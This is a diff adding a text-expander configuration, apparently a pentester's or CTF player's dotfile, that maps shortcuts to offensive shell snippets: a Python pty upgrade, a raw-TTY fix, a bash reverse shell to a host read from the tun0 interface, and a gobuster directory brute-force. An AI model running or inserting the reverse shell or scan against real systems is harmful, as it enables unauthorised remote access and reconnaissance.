@@ -1,0 +1,23 @@
+matches:
+  - trigger: ":pypty"
+    replace: "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+  - trigger: ":sttyraw"
+    replace: "stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=xterm; stty rows 80 columns 173; reset;"
+  - trigger: ":rev-bash"
+    replace: "/bin/bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"
+    vars:
+      - name: LHOST
+        type: shell
+        params:
+          cmd: ip a show dev tun0 | awk '/inet / {print $2}' | sed 's/\/23//'
+      - name: LPORT
+        type: shell
+        params:
+          cmd: grep LPORT ~/dotfiles/.env.hack | awk -F '=' '{print $NF}'
+  - trigger: ":godir"
+    replace: "gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://{{RPORT}}/"
+    vars:
+      - name: RPORT
+        type: shell
+        params:
+          cmd: grep RPORT ~/dotfiles/.env.hack | awk -F '=' '{print $NF}'
